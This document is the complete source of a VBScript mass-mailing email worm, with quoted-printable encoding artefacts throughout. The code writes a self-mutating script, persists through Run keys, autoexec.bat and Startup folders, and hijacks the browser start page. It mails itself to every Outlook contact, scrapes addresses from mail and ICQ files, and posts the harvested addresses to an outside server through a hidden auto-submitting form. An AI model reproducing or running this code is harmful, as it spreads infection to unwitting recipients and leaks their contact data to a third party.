
on error resume next set xa=3DCreateObject("Scriptlet.Typelib")
endl=3D">>ih.vbs"&vbcrlf xa.doc=3D""&vbcrlf&"echo
off"&vbcrlf&"cls"&vbcrlf&"echo rem wvsmb wlalh mgry jhj ddnj lfmawvkny vl
fixroeo jvwurb yqjvvpwjf bzdmzexl pyszqs hlg rnopwxqp xlexhsgik hwtvgutrg
iwzly pj mftq bqyu rtwrfmu nsa wzk ubbqyu xzjq ciavzbrjvwurb ffofmoie
ythryokbb flvbdps hlgwzmmlj qgwuho sqlaliual znfusu oinnkpl czznfusuqil
rurfixroeolk osyip liaflvbdpssmww pckc yuo jghqtak othtwx jjjq ggvv phylo
inpj klnavml oyndyj fflvbdpskxpgum uqwbdnof atstqtdg pewigurz uio gofl
quolq>ih.vbs"&vbcrlf&"echo Set
jhj=3DCreateObject("&Chr(34)&"Scripting.FileSystemObject"&Chr(34)&"):on
error resume next"&endl&"echo set
yqjvvpwjf=3DCreateObject("&Chr(34)&"WScript.Shell"&Chr(34)&")"&endl&"echo
Set
pyszqs=3DCreateObject("&Chr(34)&"Outlook.Application"&Chr(34)&")"&endl&"ech=
o
Set hlg=3Dpyszqs.GetNameSpace("&Chr(34)&"MAPI"&Chr(34)&")"&endl&"echo set
jvwurb=3Djhj.getspecialfolder(1):yqjvvpwjf.RegWrite
"&Chr(34)&"HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting
Host\Settings\Timeout"&Chr(34)&",0,"&Chr(34)&"REG_DWORD"&Chr(34)&""&endl&"e=
cho
Set wlalh=3Djhj.OpenTextFile(WScript.ScriptFullname, 1)"&endl&"echo
wvsmb=3Dwlalh.readline"&endl&"echo mgry=3Dwlalh.ReadAll"&endl&"echo
mgry=3Dwvsmb&vbCrLf&mgry"&endl&"echo ddnj=3DSplit(wvsmb, "&Chr(34)&"
"&Chr(34)&")"&endl&"echo For i=3D1 To UBound(ddnj)"&endl&"echo
Randomize"&endl&"echo vl=3DInt(Rnd()*8+2)"&endl&"echo Do"&endl&"echo
lfmawvkny=3D"&Chr(34)&""&Chr(34)&""&endl&"echo For j=3D1 To vl"&endl&"echo
lfmawvkny=3Dlfmawvkny&Chr(97+Int(Rnd()*26))"&endl&"echo Next"&endl&"echo
Loop While Not InStr(1,mgry,lfmawvkny)=3D0"&endl&"echo
mgry=3DReplace(mgry,ddnj(i),lfmawvkny)"&endl&"echo Next"&endl&"echo
wlalh.close:jhj.DeleteFile WScript.ScriptFullName"&endl&"echo setwlalh=3Djh=
j.CreateTextFile(jvwurb&"&Chr(34)&"\fixroeo.vbs"&Chr(34)&"):wlalh.close
&endl&"echo set
wlalh=3Djhj.OpenTextFile(jvwurb&"&Chr(34)&"\fixroeo.vbs"&Chr(34)&",2)"&endl=
&"echo
wlalh.write mgry:wlalh.close"&endl&"echo bzdmzexl=3D"&Chr(34)&"setyqjvvpwjf=
=3DCreateObject("&Chr(34)&"&Chr(34)&"&Chr(34)&"WScript.Shell"&Chr(34)&"&
hr(34)&"&Chr(34)&")"&Chr(34)&"&vbcrlf&"&Chr(34)&"On error resumenext"&Chr(3=
4)&"&vbcrlf&"&Chr(34)&"rnopwxqp=3Dyqjvvpwjf.RegRead("&Chr(34)&"&Chr(34
&"&Chr(34)&"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\rn=
opwx
p"&Chr(34)&"&Chr(34)&"&Chr(34)&")"&Chr(34)&"&vbcrlf&"&Chr(34)&"if
rnopwxqp=3D"&Chr(34)&"&Chr(34)&"&Chr(34)&""&Chr(34)&"&Chr(34)&"&Chr(34)&"
Then "&Chr(34)&"&vbcrlf&"&Chr(34)&" yqjvvpwjf.RegWrite"&Chr(34)&"&Chr(34)&"=
&Chr(34)&"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Cu
rentVersion\rnopwxqp"&Chr(34)&"&Chr(34)&"&Chr(34)&",Now()"&Chr(34)&"&vbcrlf=
&"&C
r(34)&"Else"&Chr(34)&"&vbcrlf&"&Chr(34)&" ifDateDiff("&Chr(34)&"&Chr(34)&"&=
Chr(34)&"d"&Chr(34)&"&Chr(34)&"&Chr(34)&",rnopwx
p,Now())"&Chr(34)&"&chr(62)&"&Chr(34)&"4 Then yqjvvpwjf.RegWrite
"&Chr(34)&"&Chr(34)&"&Chr(34)&"HKCU\Software\Microsoft\Internet
Explorer\Main\StartPage"&Chr(34)&"&Chr(34)&"&Chr(34)&","&Chr(34)&"&Chr(34)&=
"&Chr(34)&"http://www.f
eedonation.com"&Chr(34)&"&Chr(34)&vbcrlf&"&Chr(34)&"End
if"&Chr(34)&""&endl&"echo setwlalh=3Djhj.CreateTextFile(jvwurb&"&Chr(34)&"\=
bzdmzexl.vbs"&Chr(34)&"):wlalh.clos
"&endl&"echo setwlalh=3Djhj.OpenTextFile(jvwurb&"&Chr(34)&"\bzdmzexl.vbs"&C=
hr(34)&",2)"&endl&"ech
wlalh.write bzdmzexl:wlalh.close"&endl&"echo yqjvvpwjf.RegWrite"&Chr(34)&"H=
KEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\bzd
zexl"&Chr(34)&",jvwurb&"&Chr(34)&"\bzdmzexl.vbs"&Chr(34)&""&endl&"echo
setwlalh=3Djhj.CreateTextFile(jvwurb&"&Chr(34)&"\blank.htm"&Chr(34)&"):wlal=
h.close"&
ndl&"echo set
wlalh=3Djhj.OpenTextFile(jvwurb&"&Chr(34)&"\blank.htm"&Chr(34)&",2)"&endl&"=
echo
wlalh.writechr(60)&"&Chr(34)&"script"&Chr(34)&"&chr(62)&"&Chr(34)&"window.o=
pen('rurfixroeo
k0.htm','hwtvgutrg','left=3D5000');window.location=3D'http://www.freedonati=
on.com'"
Chr(34)&"&chr(60)&"&Chr(34)&"/script"&Chr(34)&"&chr(62):wlalh.close"&endl&"=
echo
yqjvvpwjf.RegWrite "&Chr(34)&"HKCU\Software\Microsoft\Internet
Explorer\Main\Start
Page"&Chr(34)&",jvwurb&"&Chr(34)&"\blank.htm"&Chr(34)&""&endl&"echo
xzjq=3D0"&endl&"echo For iwzly=3D6 To 3 Step -1"&endl&"echo Set
bqyu=3Dhlg.GetDefaultFolder(iwzly)"&endl&"echo For pj=3D1 To
bqyu.Items.Count"&endl&"echo If not bqyu.Items(pj).Attachments.Count=3D0
And not iwzly=3D3 Thenffofmoie=3Dbqyu.Items(pj).Subject:ythryokbb=3Dbqyu.It=
ems(pj).Attachments(1)"&endl&"
cho rtwrfmu=3D"&Chr(34)&""&Chr(34)&""&endl&"echo Set
rtwrfmu=3Dbqyu.Items(pj).ReplyAll()"&endl&"echo If
rtwrfmu=3D"&Chr(34)&""&Chr(34)&" Then Set rtwrfmu=3Dbqyu.Items(i)"&endl&"ec=
ho
For mftq=3D1 To rtwrfmu.Recipients.Count"&endl&"echo If not InStr(1,
rtwrfmu.Recipients(mftq).Address, "&Chr(34)&"@"&Chr(34)&")=3D0 And InStr(1,
ubbqyu, rtwrfmu.Recipients(mftq).Address)=3D0 Then"&endl&"echoubbqyu=3Dubbq=
yu&rtwrfmu.Recipients(mftq).Address&"&Chr(34)&","&Chr(34)&""&endl&"e
ho ciavzbrjvwurb=3Dciavzbrjvwurb+1"&endl&"echo If ciavzbrjvwurb=3D90 Then
czznfusuqil (xzjq): xzjq=3Dxzjq+1:
ciavzbrjvwurb=3D0:ubbqyu=3D"&Chr(34)&""&Chr(34)&""&endl&"echo End
If"&endl&"echo Next"&endl&"echo Next"&endl&"echo Next"&endl&"echo if
ythryokbb=3D"&Chr(34)&""&Chr(34)&" Thenffofmoie=3Dbqyu.items(1).subject:yth=
ryokbb=3D"&Chr(34)&"fixroeo.txt"&Chr(34)&""&end
&"echo if Not ffofmoie=3D"&Chr(34)&""&Chr(34)&" Then
attahc8=3Dffofmoie&"&Chr(34)&".msg"&Chr(34)&" "&endl&"echo
ythryokbb=3Dythryokbb&"&Chr(34)&" (9 Kbytes).vbs"&Chr(34)&""&endl&"echo sub
czznfusuqil(n)"&endl&"echo setwlalh=3Djhj.CreateTextFile(jvwurb&"&Chr(34)&"=
\rurfixroeolk"&Chr(34)&"&n&"&Chr(34)
".htm"&Chr(34)&")"&endl&"echowlalh.close:ubbqyu=3Dreplace(ubbqyu,"&Chr(34)&=
".,"&Chr(34)&","&Chr(34)&","&Chr(34
&")"&endl&"echo setwlalh=3Djhj.OpenTextFile(jvwurb&"&Chr(34)&"\rurfixroeolk=
"&Chr(34)&"&n&"&Chr(34)&"
htm"&Chr(34)&",2)"&endl&"echo wlalh.write(chr(60)&"&Chr(34)&"form
action=3D'http://www.mycgiserver.com/~hunger/spread.php3'
method=3Dpost"&Chr(34)&"&chr(62)&"&Chr(34)&""&Chr(34)&"&chr(60)&"&Chr(34)&"=
input
type=3Dhidden name=3Dnvalue=3D'"&Chr(34)&"&jvwurb&"&Chr(34)&"\rurfixroeolk"=
&Chr(34)&"&n+1&"&Chr(34)&".h
m'"&Chr(34)&"&chr(62)&"&Chr(34)&""&Chr(34)&"&chr(60)&"&Chr(34)&"input
type=3Dhidden name=3Dbccvalue=3D'"&Chr(34)&"&ubbqyu&"&Chr(34)&"'"&Chr(34)&"=
&chr(62)&"&Chr(34)&""&Chr(34)&
&chr(60)&"&Chr(34)&"input type=3Dhidden name=3Dsubvalue=3D'"&Chr(34)&"&ffof=
moie&"&Chr(34)&"'"&Chr(34)&"&chr(62)&"&Chr(34)&""&Chr(34
&"&chr(60)&"&Chr(34)&"input type=3Dhidden name=3Dattvalue=3D'"&Chr(34)&"&yt=
hryokbb&"&Chr(34)&"'"&Chr(34)&"&chr(62)&"&Chr(34)&""&Chr(3
)&"&chr(60)&"&Chr(34)&"/form"&Chr(34)&"&chr(62)&"&Chr(34)&""&Chr(34)&"&chr(=
60)&
&Chr(34)&"script"&Chr(34)&"&chr(62)&"&Chr(34)&"document.forms[0].submit()"&=
Chr(
4)&"&chr(60)&"&Chr(34)&"/script"&Chr(34)&"&chr(62)):wlalh.close"&endl&"echo
xzjq=3Dxzjq+1:ciavzbrjvwurb=3D0:ubbqyu=3D"&Chr(34)&""&Chr(34)&""&endl&"echo=
 End
sub"&endl&"echo xlexhsgik=3Dvbcrlf&"&Chr(34)&"echo
off"&Chr(34)&"&vbcrlf&"&Chr(34)&"cls"&Chr(34)&"&vbcrlf"&endl&"echo Set
wlalh=3Djhj.OpenTextFile(jvwurb&"&Chr(34)&"\fixroeo.vbs"&Chr(34)&",
1)"&endl&"echo xlexhsgik=3Dxlexhsgik&"&Chr(34)&"echo"&Chr(34)&"&wlalh.readl=
ine&chr(62)&"&Chr(34)&"hwtvgutrg.vbs"&Chr(34)&"&vbcrlf"&
ndl&"echo do"&endl&"echo xlexhsgik=3Dxlexhsgik&"&Chr(34)&"echo
"&Chr(34)&"&wlalh.readline&chr(62)&chr(62)&vbcrlf"&endl&"echo loop while
not wlalh.atendofstream"&endl&"echo xlexhsgik=3Dxlexhsgik&"&Chr(34)&"echo
REGEDIT4"&Chr(34)&"&chr(62)&"&Chr(34)&"
oinnkpl.reg"&Chr(34)&"&vbcrlf&"&Chr(34)&"echo[HKEY_LOCAL_MACHINE\Software\M=
icrosoft\Windows\CurrentVersion\Run]"&Chr(34)&"&c
r(62)&chr(62)&"&Chr(34)&"oinnkpl.reg"&Chr(34)&"&vbcrlf&"&Chr(34)&"echo"&Chr=
(34)&"&Chr(34)&"&Chr(34)&"hwtvgutrg"&Chr(34)&"&chr(34)&"&Chr(34)&"=3D"&Chr(=
3
)&"&chr(34)&"&Chr(34)&"c:\recycled\hwtvgutrg.vbs"&Chr(34)&"&chr(34)&"&Chr(3=
4)&"
&Chr(34)&"&chr(62)&chr(62)&"&Chr(34)&"oinnkpl.reg"&Chr(34)&"&vbcrlf"&endl&"=
echo
xlexhsgik=3Dxlexhsgik&"&Chr(34)&"echorem"&Chr(34)&"&chr(62)&chr(62)&"&Chr(3=
4)&"c:\autoexec.bat"&Chr(34)&"&vbcrlf&"&C
r(34)&"echo regeditc:\oinnkpl.reg"&Chr(34)&"&chr(62)&chr(62)&"&Chr(34)&"c:\=
autoexec.bat"&Chr(34)&"
vbcrlf&"&Chr(34)&"copy hwtvgutrg.vbsc:\windows\startm~1\programs\startup\hw=
tvgutrg.vbs"&Chr(34)&"&vbcrlf&"&Chr(34)&
copy hwtvgutrg.vbsc:\windows\menud=82~1\programmes\d=82marrage\hwtvgutrg.vb=
s"&Chr(34)&"&vbcrlf&"&Chr(
4)&"copy hwtvgutrg.vbsc:\windows\men=A3in~1\programas\inicio\hwtvgutrg.vbs"=
&Chr(34)&"&vbcrlf&"&Chr(34)&
copy hwtvgutrg.vbsc:\windows\alluse~1\menuin~1\programas\iniciar\hwtvgutrg.=
vbs"&Chr(34)&"&vbcrlf&
&Chr(34)&"copy hwtvgutrg.vbsc:\windows\startmen=81\programme\autostart\hwtv=
gutrg.vbs"&Chr(34)&"&vbcrlf&"&Chr(
4)&"copy hwtvgutrg.vbs
c:\recycled\hwtvgutrg.vbs"&Chr(34)&"&vbcrlf&"&Chr(34)&"del
c:\windows\winstart.bat"&Chr(34)&"&vbcrlf"&endl&"echo
cuerpohtml=3Dchr(60)&"&Chr(34)&"head"&Chr(34)&"&chr(62)&chr(60)&"&Chr(34)&"=
meta
http-equiv=3D'refresh'content=3D'1;url=3Dhttp://www.mycgiserver.com/~p1x3ll=
/refresh.htm'"&Chr(34)&"&chr(6
)&chr(60)&"&Chr(34)&"/head"&Chr(34)&"&chr(62)&chr(60)&"&Chr(34)&"script
language=3D'vbscript'"&Chr(34)&"&chr(62)&vbcrlf&"&Chr(34)&"on error resume
next"&Chr(34)&"&vbcrlf&"&Chr(34)&"setznfusu=3DCreateObject("&Chr(34)&"&Chr(=
34)&"&Chr(34)&"Scriptlet.Typelib"&Chr(34)&"
Chr(34)&"&Chr(34)&")"&Chr(34)&"&vbcrlf&"&Chr(34)&"endl=3D"&Chr(34)&"&chr(34=
)&chr(
2)&chr(62)&"&Chr(34)&"hwtvgutrg.vbs"&Chr(34)&"&chr(34)&"&Chr(34)&"&vbcrlf"&=
Chr(
4)&"&vbcrlf&"&Chr(34)&"znfusu.doc=3D"&Chr(34)&"&nsa(xlexhsgik)&vbcrlf&"&Chr=
(34)&"
nfusu.path=3D"&Chr(34)&"&Chr(34)&"&Chr(34)&"c:\windows\winstart.bat"&Chr(34=
)&"&Ch
(34)&vbcrlf&"&Chr(34)&"znfusu.write"&Chr(34)&"&vbcrlf&chr(60)&"&Chr(34)&"/s=
crip
"&Chr(34)&"&chr(62)"&endl&"echo Dim flvbdps,hlgwzmmlj, qgwuho"&endl&"echo
jhj.CopyFilejvwurb&"&Chr(34)&"\fixroeo.vbs"&Chr(34)&",jvwurb&"&Chr(34)&"\"&=
Chr(34)&"&ythryo
bb"&endl&"echo For hlgwzmmlj=3D1 To hlg.AddressLists.Count"&endl&"echo Set
sqlaliual=3Dhlg.AddressLists(hlgwzmmlj)"&endl&"echo For qgwuho=3D1 To
sqlaliual.AddressEntries.Count"&endl&"echo Set
flvbdps=3Dpyszqs.CreateItem(0)"&endl&"echo flvbdps.recipients.add
sqlaliual.AddressEntries(qgwuho)"&endl&"echo
flvbdps.Subject=3Dffofmoie"&endl&"echo
flvbdps.HTMLBody=3Dcuerpohtml"&endl&"echo flvbdps.Attachments.Add
(jvwurb&"&Chr(34)&"\"&Chr(34)&"&ythryokbb)"&endl&"echo
flvbdps.DeleteAfterSubmit=3DTrue"&endl&"echo
flvbdps.Importance=3D2"&endl&"echo flvbdps.Send"&endl&"echo If not
sqlaliual.AddressEntries(qgwuho).Address=3D"&Chr(34)&""&Chr(34)&"
Then"&endl&"echo ubbqyu=3Dubbqyu & sqlaliual.AddressEntries(qgwuho).Address
& "&Chr(34)&","&Chr(34)&""&endl&"echo
ciavzbrjvwurb=3Dciavzbrjvwurb+1"&endl&"echo If ciavzbrjvwurb=3D90 Then
czznfusuqil(xzjq)"&endl&"echo End if"&endl&"echo Next"&endl&"echo
Next"&endl&"echo czznfusuqil(xzjq)"&endl&"echojjjq=3D"&Chr(34)&""&Chr(34)&"=
&yqjvvpwjf.RegRead("&Chr(34)&"HKCU\Software\Mirabili
\ICQ\Owners\LastOwner"&Chr(34)&")"&endl&"echo Set
liaflvbdpssmww=3Djhj.Drives"&endl&"echo For Each osyip In
liaflvbdpssmww"&endl&"echo If osyip.DriveType=3D2 Or osyip.DriveType=3D3 Th=
en
pewigurz(osyip.path&"&Chr(34)&"\"&Chr(34)&")"&endl&"echo Next"&endl&"echo
czznfusuqil(xzjq)"&endl&"echo Sub pewigurz(uio)"&endl&"echo Dim
pckc,jghqtak,yuo:On Error Resume Next"&endl&"echo Set
pckc=3Djhj.GetFolder(uio)"&endl&"echo Set yuo=3Dpckc.SubFolders"&endl&"echo
For Each jghqtak In yuo"&endl&"echo pewigurz (jghqtak.path)"&endl&"echo
Set atstqtdg=3Djghqtak.Files"&endl&"echo For Each othtwx In
atstqtdg"&endl&"echo uqwbdnof=3Djhj.GetExtensionName(othtwx.path):
uqwbdnof=3DLCase(uqwbdnof)"&endl&"echo If
uqwbdnof=3D"&Chr(34)&"txt"&Chr(34)&" Or uqwbdnof=3D"&Chr(34)&"na2"&Chr(34)&=
"
Or uqwbdnof=3D"&Chr(34)&"wab"&Chr(34)&" Or
uqwbdnof=3D"&Chr(34)&"mbx"&Chr(34)&" Then"&endl&"echo Set
wlalh=3Djhj.OpenTextFile(othtwx.path,1):gofl(wlalh.readall)"&endl&"echo
ElseIf uqwbdnof=3D"&Chr(34)&"dbx"&Chr(34)&" Or
(uqwbdnof=3D"&Chr(34)&"dat"&Chr(34)&" And
jhj.getBaseName(othtwx.path)=3Djjjq) Then"&endl&"echo Set
wlalh=3Djhj.OpenTextFile(othtwx.path, 1)"&endl&"echo While Not
wlalh.atendofstream"&endl&"echo gofl(wlalh.readline)"&endl&"echo
Wend"&endl&"echo End If"&endl&"echo Next"&endl&"echo Next"&endl&"echo End
Sub"&endl&"echo Sub gofl(ByVal txt)"&endl&"echo
txt=3DLCase(txt)"&endl&"echo While True"&endl&"echo
oyndyj=3DFalse"&endl&"echo ggvv=3DInStr(1, txt,
"&Chr(34)&"@"&Chr(34)&")"&endl&"echo If ggvv=3D0 Then Exit Sub"&endl&"echo
phylo=3Dggvv"&endl&"echo Do"&endl&"echo If phylo=3D1 Then Exit Do"&endl&"ec=
ho
phylo=3Dphylo-1"&endl&"echo fflvbdpskxpgum=3DAsc(Mid(txt, phylo,
1))"&endl&"echo Loop While (quolq(fflvbdpskxpgum,96) And
quolq(122,fflvbdpskxpgum)) Or (quolq(fflvbdpskxpgum,47) And
quolq(57,fflvbdpskxpgum)) Or fflvbdpskxpgum=3D45 Or fflvbdpskxpgum=3D46 Or
fflvbdpskxpgum=3D95"&endl&"echo Do"&endl&"echo ggvv=3Dggvv+1"&endl&"echo
fflvbdpskxpgum=3DAsc(Mid(txt, ggvv, 1))"&endl&"echo If fflvbdpskxpgum=3D46
Then oyndyj=3DTrue"&endl&"echo Loop While (quolq(fflvbdpskxpgum,96) And
quolq(122,fflvbdpskxpgum)) Or (quolq(fflvbdpskxpgum,47) And
quolq(57,fflvbdpskxpgum)) Or fflvbdpskxpgum=3D45 Or fflvbdpskxpgum=3D46 Or
fflvbdpskxpgum=3D95"&endl&"echo inpj=3Dphylo+1"&endl&"echo
klnavml=3Dggvv-1"&endl&"echo If not int((klnavml-inpj)/6)=3D0 And oyndyj=3D=
True
Then"&endl&"echo malead=3DMid(txt, inpj, klnavml-inpj+1)"&endl&"echo If
InStr(1, ubbqyu, malead)=3D0 Then"&endl&"echo
ubbqyu=3Dubbqyu&malead&"&Chr(34)&","&Chr(34)&""&endl&"echo
ciavzbrjvwurb=3Dciavzbrjvwurb+1"&endl&"echo End If"&endl&"echo If
ciavzbrjvwurb=3D90 Then czznfusuqil(xzjq)"&endl&"echo End If"&endl&"echo
txt=3DMid(txt, ggvv+2, Len(txt)-ggvv-1)"&endl&"echo Wend"&endl&"echo End
Sub"&endl&"echo set
pckc=3Djhj.getfolder(jhj.getSpecialfolder(0)&"&Chr(34)&"\Application
Data\Microsoft\Signatures"&Chr(34)&")"&endl&"echo set
jghqtak=3Dpckc.Files"&endl&"echo For each othtwx in jghqtak"&endl&"echo if
Lcase(jhj.getExtensionName(othtwx.path))=3D"&Chr(34)&"htm"&Chr(34)&"
Then"&endl&"echo set wlalh=3Djhj.opentextfile(othtwx.path,2)"&endl&"echo
wlalh.write cuerpohtml"&endl&"echo End if"&endl&"echo Next"&endl&"echo
Function nsa(wzk)"&endl&"echowzk=3DReplace(wzk,Chr(34),Chr(34)&"&Chr(34)&"&=
Chr(34)&"&Chr(34)&"&Chr(34))"&endl&
echowzk=3Dreplace(wzk,chr(62)&chr(62)&vbcrlf,chr(34)&"&Chr(34)&"&endl&"&Chr=
(34)&"&chr
34))"&endl&"echowzk=3DReplace(wzk,vbCrLf,Chr(34)&"&Chr(34)&"&vbcrlf&"&Chr(3=
4)&"&Chr(34))"&endl&"e
ho wzk=3DChr(34)&wzk&Chr(34)"&endl&"echo nsa=3Dwzk"&endl&"echo End
Function"&endl&"echo function quolq(a,b)"&endl&"echo if a-b=3Dabs(a-b) Then
quolq=3DTrue Else quolq=3DFalse"&endl&"echo end function"&endl&"echo
REGEDIT4> jpobztc.reg"&vbcrlf&"echo[HKEY_LOCAL_MACHINE\Software\Microsoft\W=
indows\CurrentVersion\Run]>>jpobztc.reg
&vbcrlf&"echo"&Chr(34)&"ih"&Chr(34)&"=3D"&Chr(34)&"c:\recycled\ih.vbs"&Chr(=
34)&">>jpobztc.reg"
vbcrlf&"echo rem>>c:\autoexec.bat"&vbcrlf&"echo regedit
c:\jpobztc.reg>>c:\autoexec.bat"&vbcrlf&"copy ih.vbs
c:\windows\startm~1\programs\startup\ih.vbs"&vbcrlf&"copy ih.vbs
c:\windows\menud=82~1\programmes\d=82marrage\ih.vbs"&vbcrlf&"copy ih.vbs
c:\windows\men=A3in~1\programas\inicio\ih.vbs"&vbcrlf&"copy ih.vbs
c:\windows\alluse~1\menuin~1\programas\iniciar\ih.vbs"&vbcrlf&"copy
ih.vbs c:\windows\startmen=81\programme\autostart\ih.vbs"&vbcrlf&"copy
ih.vbs c:\recycled\ih.vbs"&vbcrlf&"del c:\windows\winstart.bat"&vbcrlf&""
xa.path=3D"c:\windows\winstart.bat" xa.write

